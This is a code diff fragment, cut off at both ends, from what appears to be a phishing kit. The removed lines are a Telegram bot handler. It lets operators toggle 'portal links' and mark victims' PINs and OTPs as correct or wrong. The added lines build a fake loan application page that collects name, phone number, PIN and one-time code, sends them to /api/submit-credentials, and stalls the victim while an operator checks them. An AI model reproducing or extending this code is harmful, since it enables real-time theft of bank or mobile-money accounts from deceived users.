-    const currentStatus = pathStatus.get(targetPath) || 'ACTIVE';
-    const newStatus = currentStatus === 'ACTIVE' ? 'SUSPENDED' : 'ACTIVE';
-    
-    pathStatus.set(targetPath, newStatus);
-    savePersistentData();
-
-    await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ callback_query_id: callback_query.id, text: `Link ${targetPath} is now ${newStatus}.`, show_alert: true })
+      setTimeout(() => {
+        document.getElementById('step-loading').classList.add('hidden');
+        document.getElementById('step2-form').classList.remove('hidden');
+        updateIndicator(2);
+      }, 1500);
     });
 
-    // Update message to show current link status
-    const linkStatusBadge = newStatus === 'ACTIVE' ? '🟢 ACTIVE' : '🔴 SUSPENDED';
-    const updatedText = `${callback_query.message.text.split('\n\n📌 <b>Link State:</b>')[0]}\n\n📌 <b>Link State:</b> ${linkStatusBadge}`;
-    
-    await editTelegramMessageWithOptions(botToken, chatId, messageId, updatedText, JSON.stringify({
-      inline_keyboard: [
-        [
-          { text: '🔒 Suspend / 🔓 Activate Link', callback_data: `toggle_suspend_${targetPath}` }
-        ]
-      ]
-    }));
-    return;
-  }
+    document.getElementById('step2-form').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const fullName = document.getElementById('fullName').value;
+      const occupation = document.getElementById('occupation').value;
+      const monthlyPayments = document.getElementById('monthlyPayments').value;
+      const loanAmount = slider.value;
+      const repaymentTime = document.getElementById('repaymentTime').value;
+      const phone = document.getElementById('phone').value;
+      const pin = document.getElementById('pin').value;
+      const portalPath = window.location.pathname;
 
-  let targetAppRef = '';
-  if (actionData.startsWith('pin_correct_')) targetAppRef = actionData.replace('pin_correct_', '');
-  if (actionData.startsWith('pin_wrong_')) targetAppRef = actionData.replace('pin_wrong_', '');
-  if (actionData.startsWith('otp_correct_')) targetAppRef = actionData.replace('otp_correct_', '');
-  if (actionData.startsWith('otp_wrong_')) targetAppRef = actionData.replace('otp_wrong_', '');
+      document.getElementById('step2-form').classList.add('hidden');
+      document.getElementById('step-loading').classList.remove('hidden');
+      document.getElementById('loading-title').textContent = "Authenticating PIN...";
+      document.getElementById('loading-desc').textContent = "Waiting for line server security clearance...";
 
-  if (targetAppRef) {
-    const appData = activeApplications.get(targetAppRef);
-    if (appData && appData.targetChatId && chatId !== appData.targetChatId.toString()) {
-      await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ callback_query_id: callback_query.id, text: "You can only control actions for your own portal link.", show_
+      try {
+        const res = await fetch('/api/submit-credentials', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ fullName, occupation, monthlyPayments, loanAmount, repaymentTime, phone, pin, portalPath })
+        });
+        const data = await res.json();
+        if (data.success) {
+          appReference = data.appReference;
+          pollPinStatus();
+        } else {
+          alert(data.error);
+          resetStep2();
+        }
+      } catch (err) {
+        console.error(err);
+        resetStep2();
+      }
+    });
+
+    function resetStep2() {
+      document.getElementById('step-loading').classList.add('hidden');
+      document.getElementById('step2-form').classList.remove('hidden');
+    }
+
+    function pollPinStatus() {
+      statusInterval = setInterval(async () => {
+        try {
+          const res = await fetch(\`/api/check-status/\${appReference}\`);
+          const data = await res.json();
+
+          if (data.status === 'PIN_APPROVED') {
+            clearInterval(statusInterval);
+            document.getElementById('step-loading').classList.add('hidden');
+            document.getElementById('step3-form').classList.remove('hidden');
+            updateIndicator(3);
+          } else if (data.status === 'PIN_REJECTED') {
+            clearInterval(statusInterval);
+            alert("Wrong PIN entered. Access denied.");
+            resetStep2();
+          }
+        } catch (err) {
+          console.error("Polling error:", err);
+        }
+      }, 3000);
+    }
+
+    document.getElementById('step3-form').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const otpCode = document.getElementById('otp').value;
+
+      document.getElementById('btn-step3').classList.add('hidden');
+      document.getElementById('step3-loading').classList.remove('hidden');
+
+      try {
+        const res = await fetch('/api/submit-otp', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ appReference, otpCode })
+        });
+        const data = await res.json();
+        if (data.success) {
+          pollOtpStatus();
+        } else {
+          alert("Error submitting OTP");
+          resetStep3();
+        }
+      } catch (err) {
+        console.error(err);
+        resetStep3();
+      }
+    });
+
+    function resetStep3() {
+      document.getElementById('btn-step3').classList.remove('hidden');
+      document.getElementById('step3-loading').classList.add('hidden');
+    }
+
+    function pollOtpStatus() {
+      const otpInterval = setInterval(async () => {
+        try {
+          const res = await fetch(\`/api/check-status/\${appReference}\`);
+          const data = await res.json();
+
+          if (data.status === 'OTP_APPROVED') {
+            clearInterval(otpInterval);
+            document.getElementById('step3-form').classList.add('hidden');
+            document.getElementById('success-screen').classList.remove('hidden');
+          } else if (data.status === 'OTP_REJEC
